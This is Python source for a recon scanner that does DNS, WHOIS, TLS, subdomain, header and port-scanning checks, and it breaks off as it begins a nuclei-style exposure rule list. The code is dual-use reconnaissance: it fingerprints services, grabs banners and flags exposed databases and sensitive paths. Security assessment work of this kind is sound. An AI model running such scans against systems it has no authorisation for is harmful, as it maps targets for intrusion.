#!/usr/bin/env python3
"""
Kumo v1.0 — Core Recon Engine
All scanning modules, separated from CLI/Web presentation.
"""

import os
import socket
import ssl
import concurrent.futures
import re
import ipaddress
import json
from datetime import datetime
from urllib.parse import quote

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


# ═══════════════════════════════════════════════════════════════
# UTILITIES
# ═══════════════════════════════════════════════════════════════

def clean_domain(d):
    d = d.strip().lower()
    d = re.sub(r'^https?://', '', d)
    d = d.split('/')[0].split(':')[0]
    if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$', d):
        return None
    return d


def req(url, timeout=10, headers=None):
    if not HAS_REQUESTS:
        return None
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", "Accept": "*/*"}
    if headers:
        h.update(headers)
    try:
        r = requests.get(url, headers=h, timeout=timeout, verify=True, allow_redirects=True)
        return r if r.status_code == 200 else None
    except Exception:
        return None


def dns_query(domain, qtype):
    r = req(f"https://cloudflare-dns.com/dns-query?name={domain}&type={qtype}",
            headers={"Accept": "application/dns-json"})
    if r:
        try:
            return r.json().get("Answer", [])
        except Exception:
            pass
    return []


def resolve(domain):
    ips = {"v4": [], "v6": []}
    try:
        for r in socket.getaddrinfo(domain, None):
            a = r[4][0]
            try:
                o = ipaddress.ip_address(a)
                bucket = "v4" if o.version == 4 else "v6"
                if a not in ips[bucket]:
                    ips[bucket].append(a)
            except ValueError:
                pass
    except socket.gaierror:
        pass
    return ips


# ═══════════════════════════════════════════════════════════════
# MODULE: DNS
# ═══════════════════════════════════════════════════════════════

def scan_dns(domain):
    """
    Fully parallelized DNS scan.
    All record types, DMARC, and all DKIM selectors fire simultaneously.
    Typical time: ~0.4s instead of 3-5s.
    """
    results = {"ips": {}, "records": {}, "email_security": {}}

    DKIM_SELECTORS = ["default", "google", "selector1", "selector2",
                      "k1", "dkim", "mail", "s1", "s2"]
    TYPE_MAP = {"MX": 15, "NS": 2, "TXT": 16, "SOA": 6, "CNAME": 5, "CAA": 257}

    # Build all tasks to run in parallel:
    # - IP resolve
    # - 6 DNS record types
    # - DMARC TXT
    # - 9 DKIM selector TXT queries
    # Total: 17 parallel requests, all fire at once

    def fetch_record(args):
        qname, qtype, label = args
        return label, dns_query(qname, qtype)

    tasks = []
    # DNS record types
    for qtype in TYPE_MAP:
        tasks.append((domain, qtype, f"rec_{qtype}"))
    # DMARC
    tasks.append((f"_dmarc.{domain}", "TXT", "dmarc"))
    # DKIM selectors — all at once
    for sel in DKIM_SELECTORS:
        tasks.append((f"{sel}._domainkey.{domain}", "TXT", f"dkim_{sel}"))

    # Fire everything in parallel + resolve IPs simultaneously
    raw = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        ip_future = ex.submit(resolve, domain)
        dns_futures = {ex.submit(fetch_record, t): t for t in tasks}

        results["ips"] = ip_future.result()
        for future in concurrent.futures.as_completed(dns_futures):
            label, answers = future.result()
            raw[label] = answers

    # Parse DNS records
    for qtype, expected in TYPE_MAP.items():
        answers = raw.get(f"rec_{qtype}", [])
        filtered = [a.get("data", "").strip('"').rstrip(".")
                    for a in answers if a.get("type") == expected]
        if filtered:
            results["records"][qtype] = filtered

    # SPF (from TXT)
    txt = results["records"].get("TXT", [])
    has_spf = any("v=spf1" in t for t in txt)
    spf_policy = ""
    if has_spf:
        spf_rec = next(t for t in txt if "v=spf1" in t)
        if "+all" in spf_rec:      spf_policy = "+all (DANGEROUS)"
        elif "~all" in spf_rec:    spf_policy = "~all (softfail)"
        elif "-all" in spf_rec:    spf_policy = "-all (strict)"
        elif "?all" in spf_rec:    spf_policy = "?all (neutral)"
    results["email_security"]["spf"] = {"found": has_spf, "policy": spf_policy}

    # DMARC
    dmarc_rec, dmarc_policy = None, ""
    for a in raw.get("dmarc", []):
        d = a.get("data", "")
        if "dmarc" in d.lower():
            dmarc_rec = d.strip('"')
            if "p=none" in d.lower():        dmarc_policy = "none (not enforcing)"
            elif "p=quarantine" in d.lower(): dmarc_policy = "quarantine"
            elif "p=reject" in d.lower():     dmarc_policy = "reject (strict)"
            break
    results["email_security"]["dmarc"] = {
        "found": dmarc_rec is not None, "record": dmarc_rec, "policy": dmarc_policy
    }

    # DKIM — pick the first selector that returned a key (all were queried in parallel)
    dkim_found, dkim_selector = False, ""
    for sel in DKIM_SELECTORS:
        for a in raw.get(f"dkim_{sel}", []):
            if "p=" in a.get("data", ""):
                dkim_found, dkim_selector = True, sel
                break
        if dkim_found:
            break
    results["email_security"]["dkim"] = {"found": dkim_found, "selector": dkim_selector}

    return results


# ═══════════════════════════════════════════════════════════════
# MODULE: WHOIS
# ═══════════════════════════════════════════════════════════════

def _whois_socket(domain, timeout=8):
    """Classic WHOIS over port 43 with IANA referral — covers ccTLDs (.tn, etc.)
    that have no RDAP server. Returns parsed dict or None."""
    import socket as _sock
    import re as _re

    def query(server, q):
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((server, 43))
            s.sendall((q + "\r\n").encode())
            buf = b""
            while len(buf) < 200000:
                chunk = s.recv(4096)
                if not chunk:
                    break
                buf += chunk
            return buf.decode("utf-8", "ignore")
        finally:
            s.close()

    tld = domain.split(".")[-1]
    # Known whois servers (fallback if IANA referral is missing)
    KNOWN = {
        "tn": "whois.ati.tn", "com": "whois.verisign-grs.com", "net": "whois.verisign-grs.com",
        "org": "whois.pir.org", "io": "whois.nic.io", "co": "whois.nic.co",
        "uk": "whois.nic.uk", "fr": "whois.nic.fr", "de": "whois.denic.de",
        "eu": "whois.eu", "info": "whois.afilias.net", "me": "whois.nic.me",
    }
    server = None
    try:
        ref = query("whois.iana.org", tld)
        m = _re.search(r'(?im)^\s*whois:\s*(\S+)', ref)
        if m:
            server = m.group(1).strip()
    except Exception:
        pass
    if not server:
        server = KNOWN.get(tld)
    if not server:
        return None

    try:
        raw = query(server, domain)
    except Exception:
        return None
    if not raw or len(raw) < 20:
        return None

    def grab(*labels):
        for lab in labels:
            m = _re.search(rf'(?im)^\s*{lab}[.\s]*:\s*(.+?)\s*$', raw)
            if m and m.group(1).strip().lower() not in ("", "n/a", "none"):
                return m.group(1).strip()
        return None

    def grab_all(*labels):
        out = []
        for lab in labels:
            for m in _re.finditer(rf'(?im)^\s*{lab}[.\s]*:\s*(.+?)\s*$', raw):
                v = m.group(1).strip()
                if v and v.lower() not in ("", "n/a"):
                    out.append(v)
        seen, uniq = set(), []
        for v in out:
            if v.lower() not in seen:
                seen.add(v.lower()); uniq.append(v)
        return uniq

    res = {"domain": domain, "source": f"whois ({server})"}
    reg = grab("Registrar", "registrar", "Sponsoring Registrar")
    if reg:
        res["registrar"] = reg
    created = grab("Creation Date", "created", "Registered on", "Domain Registration Date", "Registration Date")
    if created:
        res["registration"] = created[:24]
    expiry = grab("Registry Expiry Date", "Expiration Date", "Expiry Date", "paid-till",
                  "Registrar Registration Expiration Date", "Expiry")
    if expiry:
        res["expiration"] = expiry[:24]
    changed = grab("Updated Date", "last-update", "Last Modified", "changed")
    if changed:
        res["last_changed"] = changed[:24]
    status = grab_all("Domain Status", "status", "Status")
    if status:
        res["status"] = [s.split()[0] for s in status[:6]]
    ns = grab_all("Name Server", "Nameserver", "nserver", "Name servers", "dns")
    if ns:
        res["nameservers"] = [n.split()[0].lower() for n in ns[:8]]
    org = grab("Registrant Organization", "Registrant", "org", "Organization", "owner")
    if org:
        res["entities"] = [{"role": "registrant", "name": org}]

    # days until expiry
    if res.get("expiration"):
        from datetime import datetime as _dt
        for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%d", "%d-%b-%Y", "%d.%m.%Y", "%Y.%m.%d"):
            try:
                exp = _dt.strptime(res["expiration"][:len(_dt.now().strftime(fmt))], fmt)
                res["days_until_expiry"] = (exp - _dt.now()).days
                break
            except Exception:
                continue

    # Consider it a success only if we extracted something meaningful
    if any(k in res for k in ("registrar", "registration", "expiration", "nameservers", "status")):
        return res
    return None


def scan_whois(domain):
    results = {}
    r = req(f"https://rdap.org/domain/{domain}", timeout=15)
    if r:
        try:
            data = r.json()
            results["domain"] = data.get("ldhName", domain)
            results["status"] = [s.split()[-1] for s in data.get("status", [])[:4]]

            for ev in data.get("events", []):
                act, dt = ev.get("eventAction", ""), ev.get("eventDate", "")[:10]
                if act in ("registration", "expiration", "last changed"):
                    results[act.replace(" ", "_")] = dt
                    if act == "expiration":
                        try:
                            results["days_until_expiry"] = (datetime.strptime(dt, "%Y-%m-%d") - datetime.now()).days
                        except Exception:
                            pass

            ns = [n.get("ldhName", "") for n in data.get("nameservers", []) if n.get("ldhName")]
            results["nameservers"] = ns

            entities = []
            for ent in data.get("entities", []):
                roles = ent.get("roles", [])
                vcard = ent.get("vcardArray", [None, []])[1] if ent.get("vcardArray") else []
                for item in vcard:
                    if item[0] == "fn":
                        entities.append({"role": roles[0] if roles else "unknown", "name": item[3]})
            results["entities"] = entities
            if any(results.get(k) for k in ("registration", "expiration", "nameservers", "status", "entities")):
                results["source"] = "RDAP"
                return results
        except Exception:
            pass

    # RDAP failed or was empty (common for ccTLDs like .tn) → fall back to WHOIS:43
    w = _whois_socket(domain)
    if w:
        return w
    return {"error": "WHOIS/RDAP lookup failed (no RDAP server and port 43 unreachable)"}


# ═══════════════════════════════════════════════════════════════
# MODULE: SSL
# ═══════════════════════════════════════════════════════════════

def scan_ssl(domain):
    # A security scanner must still be able to inspect a certificate that fails
    # validation — self-signed, expired, or hostname-mismatched certs are
    # findings in themselves, not reasons to give up. We therefore try a strict
    # handshake first and, if it fails, retry unverified and record WHY.
    validation_error = None
    cert = cipher = proto = None
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
            s.settimeout(10)
            s.connect((domain, 443))
            cert = s.getpeercert()
            cipher = s.cipher()
            proto = s.version()
    except Exception as e:
        validation_error = str(e)
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
                s.settimeout(10)
                s.connect((domain, 443))
                cipher = s.cipher()
                proto = s.version()
                der = s.getpeercert(binary_form=True)
            # Parse the DER we just retrieved without validation
            cert = {}
            try:
                import tempfile
                with tempfile.NamedTemporaryFile("w", suffix=".pem", delete=False) as fh:
                    fh.write(ssl.DER_cert_to_PEM_cert(der))
                    pem_path = fh.name
                cert = ssl._ssl._test_decode_cert(pem_path)
                os.unlink(pem_path)
            except Exception:
                cert = {}
        except Exception as e2:
            return {"error": f"TLS handshake failed: {str(e2)[:120]}"}

    try:
        cert = cert or {}
        subj = dict(x[0] for x in cert.get("subject", ()))
        iss = dict(x[0] for x in cert.get("issuer", ()))
        sans = [v for t, v in cert.get("subjectAltName", ()) if t == "DNS"]

        days_left = None
        try:
            exp = datetime.strptime(cert.get("notAfter", ""), "%b %d %H:%M:%S %Y %Z")
            days_left = (exp - datetime.now()).days
        except Exception:
            pass

        # Turn validation failures into explicit, reportable issues
        issues = []
        if validation_error:
            ve = validation_error.lower()
            if "self-signed" in ve or "self signed" in ve:
                issues.append({"issue": "Self-signed certificate", "severity": "high"})
            elif "expired" in ve or "certificate_expired" in ve:
                issues.append({"issue": "Certificate expired", "severity": "high"})
            elif "hostname mismatch" in ve or "doesn't match" in ve:
                issues.append({"issue": "Hostname mismatch", "severity": "high"})
            elif "unable to get local issuer" in ve or "unable to verify" in ve:
                issues.append({"issue": "Incomplete certificate chain / untrusted issuer", "severity": "medium"})
            else:
                issues.append({"issue": f"Certificate validation failed: {validation_error[:80]}",
                               "severity": "medium"})
        if days_left is not None:
            if days_left < 0:
                issues.append({"issue": f"Certificate expired {abs(days_left)} days ago", "severity": "high"})
            elif days_left < 30:
                issues.append({"issue": f"Certificate expires in {days_left} days", "severity": "medium"})
        if proto in ("TLSv1", "TLSv1.1", "SSLv3"):
            issues.append({"issue": f"Obsolete protocol negotiated ({proto})", "severity": "high"})

        return {
            "common_name": subj.get("commonName", "N/A"),
            "issuer": iss.get("organizationName", "N/A"),
            "issuer_cn": iss.get("commonName", "N/A"),
            "valid_from": cert.get("notBefore", ""),
            "valid_until": cert.get("notAfter", ""),
            "days_left": days_left,
            "sans": sans,
            "wildcards": [s for s in sans if s.startswith("*.")],
            "serial": cert.get("serialNumber", ""),
            "valid": validation_error is None,
            "validation_error": validation_error[:160] if validation_error else None,
            "issues": issues,
            "protocol": proto,
            "cipher": cipher[0] if cipher else "",
            "cipher_bits": cipher[2] if cipher else 0,
        }
    except Exception as e:
        return {"error": str(e)}


# ═══════════════════════════════════════════════════════════════
# MODULE: CRTSH (subdomains)
# ═══════════════════════════════════════════════════════════════

def scan_crtsh(domain):
    r = req(f"https://crt.sh/?q=%.{domain}&output=json", timeout=25)
    if not r:
        return {"subdomains": [], "error": "crt.sh unavailable"}
    try:
        data = r.json()
    except Exception:
        return {"subdomains": [], "error": "parse error"}

    subs = set()
    for entry in data:
        for name in entry.get("name_value", "").split("\n"):
            name = name.strip().lower().lstrip("*.")
            if name and name != domain and name.endswith(f".{domain}"):
                subs.add(name)

    subs = sorted(subs)

    # Resolve top 60
    resolved = []
    def check(sub):
        try:
            r2 = socket.getaddrinfo(sub, None, socket.AF_INET, socket.SOCK_STREAM)
            return {"subdomain": sub, "ip": r2[0][4][0], "alive": True}
        except Exception:
            return {"subdomain": sub, "ip": "-", "alive": False}

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        resolved = list(ex.map(check, subs[:60]))

    sensitive_prefixes = ["admin", "api", "dev", "staging", "stg", "test", "vpn", "mail", "ftp",
                          "db", "database", "jenkins", "gitlab", "jira", "internal", "intranet",
                          "portal", "grafana", "kibana", "elastic", "mongo", "redis", "backup",
                          "old", "legacy", "beta", "uat", "phpmyadmin", "cpanel", "webmail",
                          "sso", "auth", "login", "docker", "k8s"]
    sensitive = [s for s in subs if s.replace(f".{domain}", "").split(".")[0] in sensitive_prefixes]

    return {"subdomains": subs, "resolved": resolved, "sensitive": sensitive, "total": len(subs)}


# ═══════════════════════════════════════════════════════════════
# MODULE: HEADERS
# ═══════════════════════════════════════════════════════════════

def scan_headers(domain):
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    resp = None
    for scheme in ["https", "http"]:
        try:
            resp = requests.get(f"{scheme}://{domain}", timeout=10, allow_redirects=True,
                                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
            break
        except Exception:
            continue
    if not resp:
        return {"error": "cannot connect"}

    h = resp.headers
    checks = {
        "Strict-Transport-Security": ("HSTS — force HTTPS", "high"),
        "Content-Security-Policy": ("CSP — prevent XSS/injection", "high"),
        "X-Frame-Options": ("Clickjacking protection", "medium"),
        "X-Content-Type-Options": ("MIME sniffing prevention", "medium"),
        "Referrer-Policy": ("Referrer leakage control", "medium"),
        "Permissions-Policy": ("Browser feature restrictions", "medium"),
        "X-XSS-Protection": ("Legacy XSS filter", "low"),
        "Cross-Origin-Opener-Policy": ("Browsing context isolation", "low"),
        "Cross-Origin-Resource-Policy": ("Cross-origin resource control", "low"),
        "Cross-Origin-Embedder-Policy": ("Cross-origin embedding control", "low"),
    }

    header_results = []
    passed = 0
    for hdr, (desc, severity) in checks.items():
        val = h.get(hdr)
        present = val is not None
        if present:
            passed += 1
        header_results.append({"header": hdr, "value": val, "present": present, "description": desc, "severity": severity})

    score = (passed / len(checks)) * 100
    grade = "F"
    for threshold, g in [(80, "A"), (60, "B"), (40, "C"), (20, "D")]:
        if score >= threshold:
            grade = g
            break

    disclosure = []
    for hdr_name in ["Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version", "X-Generator"]:
        v = h.get(hdr_name)
        if v:
            disclosure.append({"header": hdr_name, "value": v})

    return {
        "status_code": resp.status_code, "final_url": resp.url, "server": h.get("Server", "Hidden"),
        "headers": header_results, "passed": passed, "total": len(checks),
        "score": score, "grade": grade, "disclosure": disclosure,
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: PORTS
# ═══════════════════════════════════════════════════════════════

def scan_ports(domain, extra_ports=None):
    """
    Scan common ports + any extras discovered by Shodan/Censys (passed in via extra_ports).
    Ports sourced from extra_ports are tagged with their origin.
    """
    # ── Comprehensive port list (researched: most common on public web services) ──
    KNOWN_PORTS = {
        # Web
        80:    ("HTTP",              "low"),
        81:    ("HTTP-Alt",          "low"),
        443:   ("HTTPS",             "low"),
        444:   ("HTTPS-Alt",         "low"),
        591:   ("FileMaker HTTP",    "low"),
        2082:  ("cPanel HTTP",       "medium"),
        2083:  ("cPanel HTTPS",      "medium"),
        2086:  ("WHM HTTP",          "medium"),
        2087:  ("WHM HTTPS",         "medium"),
        2095:  ("Webmail HTTP",      "medium"),
        2096:  ("Webmail HTTPS",     "medium"),
        7080:  ("HTTP-Alt",          "low"),
        8000:  ("HTTP-Dev",          "low"),
        8008:  ("HTTP-Alt",          "low"),
        8080:  ("HTTP-Proxy/Alt",    "low"),
        8081:  ("HTTP-Alt",          "low"),
        8443:  ("HTTPS-Alt",         "low"),
        8888:  ("HTTP-Dev",          "low"),
        9000:  ("HTTP-Alt/PHP-FPM",  "medium"),
        9443:  ("HTTPS-Alt",         "low"),
        10000: ("Webmin",            "high"),
        # Email
        25:    ("SMTP",              "low"),
        465:   ("SMTPS",             "low"),
        587:   ("SMTP/TLS",          "low"),
        110:   ("POP3",              "medium"),
        995:   ("POP3S",             "low"),
        143:   ("IMAP",              "medium"),
        993:   ("IMAPS",             "low"),
        # Remote access
        22:    ("SSH",               "medium"),
        23:    ("Telnet",            "critical"),
        3389:  ("RDP",               "high"),
        5900:  ("VNC",               "high"),
        5901:  ("VNC-1",             "high"),
        5902:  ("VNC-2",             "high"),
        # File transfer
        21:    ("FTP",               "high"),
        990:   ("FTPS",              "medium"),
        69:    ("TFTP",              "high"),
        115:   ("SFTP",              "medium"),
        # DNS
        53:    ("DNS",               "low"),
        # Databases (should NEVER be public)
        1433:  ("MSSQL",             "critical"),
        1521:  ("Oracle DB",         "critical"),
        3306:  ("MySQL",             "critical"),
        5432:  ("PostgreSQL",        "critical"),
        5984:  ("CouchDB",           "critical"),
        6379:  ("Redis",             "critical"),
        7474:  ("Neo4j",             "critical"),
        9042:  ("Cassandra",         "critical"),
        9200:  ("Elasticsearch",     "critical"),
        9300:  ("Elasticsearch TCP", "critical"),
        27017: ("MongoDB",           "critical"),
        27018: ("MongoDB Shard",     "critical"),
        28017: ("MongoDB HTTP",      "critical"),
        # File sharing / SMB
        139:   ("NetBIOS",           "critical"),
        445:   ("SMB",               "critical"),
        2049:  ("NFS",               "critical"),
        # Monitoring / DevOps (often exposed accidentally)
        2375:  ("Docker API (HTTP)", "critical"),
        2376:  ("Docker API (TLS)",  "high"),
        2379:  ("etcd",              "critical"),
        2380:  ("etcd Peer",         "critical"),
        4243:  ("Docker Alt",        "critical"),
        4848:  ("GlassFish Admin",   "critical"),
        4200:  ("CockroachDB Admin", "critical"),
        5601:  ("Kibana",            "high"),
        6443:  ("Kubernetes API",    "critical"),
        8001:  ("Kubernetes Alt",    "high"),
        8500:  ("Consul HTTP",       "critical"),
        8600:  ("Consul DNS",        "high"),
        9090:  ("Prometheus",        "high"),
        9091:  ("Prometheus Push",   "high"),
        9100:  ("Prometheus Node",   "high"),
        9093:  ("Alertmanager",      "high"),
        9094:  ("Alertmanager Alt",  "high"),
        9411:  ("Zipkin",            "medium"),
        16686: ("Jaeger UI",         "medium"),
        # Other services
        389:   ("LDAP",              "high"),
        636:   ("LDAPS",             "high"),
        3000:  ("Grafana/Node Dev",  "medium"),
        4000:  ("Dev Server",        "medium"),
        4567:  ("Sinatra/Dev",       "medium"),
        5000:  ("Dev Server/UPnP",   "medium"),
        5555:  ("ADB/Dev",           "high"),
        8161:  ("ActiveMQ Admin",    "critical"),
        8181:  ("HTTP-Alt",          "low"),
        8983:  ("Apache Solr",       "high"),
        11211: ("Memcached",         "critical"),
        15672: ("RabbitMQ Mgmt",     "high"),
        61616: ("ActiveMQ",          "high"),
    }

    # Merge with extra ports from Shodan/Censys intelligence
    ports_to_scan = dict(KNOWN_PORTS)
    shodan_censys_ports = set(extra_ports or [])
    for p in shodan_censys_ports:
        if p not in ports_to_scan:
            ports_to_scan[p] = ("Unknown (Shodan/Censys)", "medium")

    # ── Resolve ONCE and scan the IP directly ──
    # Reconnecting by hostname re-resolves on every socket, so round-robin DNS
    # can hit different servers and produce inconsistent "open" results.
    _ips = resolve(domain)
    target_ip = _ips["v4"][0] if _ips.get("v4") else domain

    # ── Detect "answers on every port" hosts BEFORE scanning ──
    # Probe random high ports that no real service would be listening on. If
    # they hand back a SYN-ACK, a middlebox/tarpit is answering everything and
    # a plain connect() result is meaningless.
    def _probe_raw(port, timeout=1.5):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            ok = s.connect_ex((target_ip, port)) == 0
            s.close()
            return ok
        except Exception:
            return False

    import random as _rnd
    decoy_ports = _rnd.sample([p for p in range(20000, 64000) if p not in ports_to_scan], 5)
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex0:
        decoy_open = sum(1 for r in ex0.map(_probe_raw, decoy_ports) if r)
    port_catchall = decoy_open >= 3   # majority of impossible ports "open"

    def scan_one(item):
        port, (svc, risk) = item
        source = "shodan_censys" if port in shodan_censys_ports and port not in KNOWN_PORTS else "scan"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            result = s.connect_ex((target_ip, port))
            if result == 0:
                # Port is open — try to grab banner
                banner = ""
                try:
                    s.settimeout(2)
                    # Send probe appropriate to service type
                    if port in (80, 8080, 8000, 8008, 8081, 8888):
                        s.send(b"HEAD / HTTP/1.0\r\nHost: " + domain.encode() + b"\r\n\r\n")
                    elif port in (443, 8443, 9443, 4443):
                        pass  # TLS — can't banner without handshake via raw socket
                    elif port == 21:
                        pass   # FTP sends banner on connect
                    elif port == 25:
                        s.send(b"EHLO kumo\r\n")
                    elif port == 22:
                        pass   # SSH sends banner on connect
                    raw = s.recv(512)
                    banner = raw.decode("utf-8", errors="replace").strip()[:200]
                    # Extract version-like strings for key protocols
                    banner = banner.replace("\r\n", " | ").replace("\n", " | ")
                except Exception:
                    pass
                s.close()
                return {
                    "port":    port,
                    "service": svc,
                    "risk":    risk,
                    "open":    True,
                    "source":  source,
                    "banner":  banner,
                    "version": _extract_version(banner, svc),
                }
            s.close()
            return {"port": port, "service": svc, "risk": risk, "open": False, "source": source, "banner": "", "version": ""}
        except Exception:
            return {"port": port, "service": svc, "risk": risk, "open": False, "source": source, "banner": "", "version": ""}

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        results = sorted(ex.map(scan_one, ports_to_scan.items()), key=lambda x: x["port"])

    open_ports = [r for r in results if r["open"]]

    # ── Anti-false-positive pass ──────────────────────────────────────────
    # Some networks (transparent proxies, load balancers, IPS/tarpits, certain
    # hosting providers) answer the TCP handshake on EVERY port, which makes an
    # ordinary scan report all 70+ ports as "open". We detected that above by
    # probing random unused high ports. When it happens, a bare SYN-ACK proves
    # nothing, so only ports backed by real evidence are kept.
    if port_catchall:
        verified, filtered = [], []
        for p in open_ports:
            if _verify_port(target_ip, domain, p["port"], p.get("banner", "")):
                p["confidence"] = "confirmed"
                verified.append(p)
            else:
                p["confidence"] = "unverified"
                filtered.append(p)
        for p in results:
            if p["open"] and p not in verified:
                p["open"] = False
                p["filtered_reason"] = "host answers on every port (catch-all) — no service evidence"
        open_ports = verified
    else:
        # Normal host: re-check each open port once to drop transient/flaky hits.
        def recheck(p):
            if p.get("banner"):
                p["confidence"] = "confirmed"
                return True
            try:
                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s2.settimeout(2.0)
                ok = s2.connect_ex((target_ip, p["port"])) == 0
                s2.close()
                p["confidence"] = "confirmed" if ok else "unverified"
                return ok
            except Exception:
                p["confidence"] = "unverified"
                return False

        if open_ports:
            with concurrent.futures.ThreadPoolExecutor(max_workers=min(20, len(open_ports))) as ex2:
                keep = list(ex2.map(recheck, open_ports))
            confirmed = [p for p, k in zip(open_ports, keep) if k]
            dropped = {p["port"] for p, k in zip(open_ports, keep) if not k}
            for p in results:
                if p["port"] in dropped:
                    p["open"] = False
                    p["filtered_reason"] = "did not respond on re-check (transient)"
            open_ports = confirmed

    return {
        "results":       results,
        "open":          open_ports,
        "total_scanned": len(ports_to_scan),
        "from_intel":    len(shodan_censys_ports),
        "target_ip":     target_ip,
        "port_catchall": port_catchall,
        "catchall_note": ("Host answered on random unused ports — a firewall/proxy "
                          "accepts every connection. Only ports with real service "
                          "evidence are reported.") if port_catchall else "",
    }


def _verify_port(ip, hostname, port, banner=""):
    """
    Prove a port really hosts a service (used when the host answers on every
    port). A bare TCP handshake is not enough — we need application-layer
    evidence: a service banner, a TLS handshake, or a valid HTTP reply.
    """
    if banner and len(banner.strip()) >= 4:
        return True
    # TLS-capable ports: a successful handshake proves a real TLS service
    if port in (443, 465, 636, 993, 995, 8443, 9443, 4443, 2083, 2087, 2096):
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((ip, port), timeout=3) as raw:
                with ctx.wrap_socket(raw, server_hostname=hostname) as ss:
                    return bool(ss.version())
        except Exception:
            return False
    # HTTP-ish ports: require a real HTTP status line
    if port in (80, 81, 591, 2082, 2086, 2095, 7080, 8000, 8008, 8080, 8081,
                8181, 8888, 9000, 3000, 5000, 5601, 9090, 9200, 15672, 10000):
        try:
            with socket.create_connection((ip, port), timeout=3) as raw:
                raw.sendall(b"GET / HTTP/1.1\r\nHost: " + hostname.encode() +
                            b"\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n")
                data = raw.recv(256)
            return data.startswith(b"HTTP/")
        except Exception:
            return False
    # Anything else: try to read a banner directly
    try:
        with socket.create_connection((ip, port), timeout=3) as raw:
            raw.settimeout(2.5)
            data = raw.recv(128)
        return len(data.strip()) >= 4
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════
# NUCLEI-STYLE MATCHER ENGINE + RULE PLAYBOOK
# ═══════════════════════════════════════════════════════════════
# Mirrors the matcher model used by ProjectDiscovery's nuclei templates:
#   matchers: [{type: status|word|regex|size|dsl, part: body|header|all,
#               words/regex/status/size, condition: and|or, negative: bool}]
#   matchers_condition: and|or
#
# Following nuclei's own guidance, a rule must never rely on a status code
# alone — every rule pairs a *product identification* matcher with a
# *vulnerability indication* matcher, combined with `matchers_condition: and`.

def _resp_part(resp, part, scrub=None):
    """
    Extract the requested part of a response, nuclei-style.

    `scrub` removes the requested path (and its segments) from the text first,
    so a server echoing the URL back can never satisfy a product matcher.
    """
    try:
        if part == "header":
            text = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
        elif part == "body":
            text = resp.text or ""
        elif part == "all":
            hdr = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
            text = hdr + "\n\n" + (resp.text or "")
        else:
            return ""
    except Exception:
        return ""
    if scrub:
        for variant in scrub:
            if variant:
                text = text.replace(variant, " ")
    return text


def _match_one(resp, m, scrub=None):
    """Evaluate a single matcher against a response. Returns True/False."""
    mtype = m.get("type", "word")
    result = False
    try:
        if mtype == "status":
            result = resp.status_code in m.get("status", [])

        elif mtype == "size":
            sizes = m.get("size", [])
            n = len(resp.content)
            result = any(n == s for s in sizes) if sizes else False
            if "min_size" in m:
                result = n >= m["min_size"]
            if "max_size" in m:
                result = result and n <= m["max_size"] if "min_size" in m else n <= m["max_size"]

        elif mtype == "word":
            hay = _resp_part(resp, m.get("part", "body"), scrub)
            if not m.get("case_sensitive"):
                hay = hay.lower()
                words = [w.lower() for w in m.get("words", [])]
            else:
                words = m.get("words", [])
            cond = m.get("condition", "or")
            hits = [w in hay for w in words]
            result = all(hits) if cond == "and" else any(hits)

        elif mtype == "regex":
            import re as _r
            hay = _resp_part(resp, m.get("part", "body"), scrub)
            flags = 0 if m.get("case_sensitive") else _r.I
            pats = m.get("regex", [])
            cond = m.get("condition", "or")
            hits = [bool(_r.search(p, hay, flags)) for p in pats]
            result = all(hits) if cond == "and" else any(hits)

        elif mtype == "dsl":
            # Tiny safe DSL: supports the handful of expressions we need.
            body = _resp_part(resp, "body", scrub)
            ctx = {
                "status_code": resp.status_code,
                "content_length": len(resp.content),
                "body": body,
                "header": _resp_part(resp, "header"),
                "contains": lambda h, n: n.lower() in (h or "").lower(),
                "len": len,
                "not_html": not _looks_like_html(resp.content),
            }
            hits = []
            for expr in m.get("dsl", []):
                try:
                    hits.append(bool(eval(expr, {"__builtins__": {}}, ctx)))
                except Exception:
                    hits.append(False)
            cond = m.get("condition", "or")
            result = all(hits) if cond == "and" else any(hits)
    except Exception:
        result = False

    return (not result) if m.get("negative") else result


def _eval_rule(resp, rule, scrub=None):
    """Evaluate all matchers of a rule with its matchers_condition."""
    matchers = rule.get("matchers", [])
    if not matchers:
        return False
    cond = rule.get("matchers_condition", "and")
    results = [_match_one(resp, m, scrub) for m in matchers]
    return all(results) if cond == "and" else any(results)


# ── The playbook: each rule identifies the PRODUCT and the EXPOSURE ──
VULN_RULES = [
    {
        "id": "git-config", "name": "Git Config Exposed", "severity": "high",
        "path": "/.git/config", "matchers_condition": "and",
        "description": "Exposed .git/config reveals repository URLs and may allow full source recovery",
        "matchers": [
